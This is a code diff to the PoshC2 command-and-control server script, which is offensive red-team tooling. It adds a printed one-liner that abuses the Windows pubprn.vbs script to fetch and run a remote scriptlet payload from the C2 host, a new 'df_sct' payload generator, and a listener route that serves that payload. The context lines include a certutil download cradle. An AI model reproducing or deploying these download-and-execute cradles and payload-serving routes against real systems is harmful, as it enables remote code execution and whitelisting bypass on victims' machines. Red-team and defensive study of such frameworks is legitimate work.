@@ -321,6 +321,7 @@ if ($RestartC2Server)
     write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
     write-Host "To download PoshC2 InstallUtil/General executable use the following URL:"
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_df`"" -ForegroundColor green
     write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/webapp/static/$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
     write-host ""
 
@@ -715,6 +716,7 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
     write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
     write-Host "To download PoshC2 InstallUtil/General executable use the following URL:"
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_df`"" -ForegroundColor green
     write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/webapp/static/$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
     write-host ""
 
@@ -732,23 +734,25 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
         # create all payloads
         CreatePayload
         CreateStandAloneExe
-        rg_sct
-        cs_sct
         CreateHTAPayload
         CreateMacroPayload
         Create-MS16-051-Payload
         CreateLink
         CreateServiceExe
         CreateJavaPayload
-        poshjs
         createdll
+        poshjs
+        rg_sct
+        cs_sct
+        df_sct
     } else {
         # create limited payloads
         CreatePayload
         CreateStandAloneExe
+        CreateServiceExe
         rg_sct
         cs_sct
-        CreateServiceExe
+        df_sct
     }
 
     
@@ -858,6 +862,16 @@ while ($listener.IsListening)
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/js_sct.xml")){
             $message = [IO.File]::ReadAllText("$global:newdir/payloads/js_sct.xml")
+        }else {
+            $message = $httpresponse
+        }
+
+    }
+    if ($request.Url -match "/webapp/static/$($downloaduri)_df$") 
+    {
+
+        if ([System.IO.File]::Exists("$global:newdir/payloads/df_sct.xml")){
+            $message = [IO.File]::ReadAllText("$global:newdir/payloads/df_sct.xml")
         }else {
             $message = $httpresponse
         }
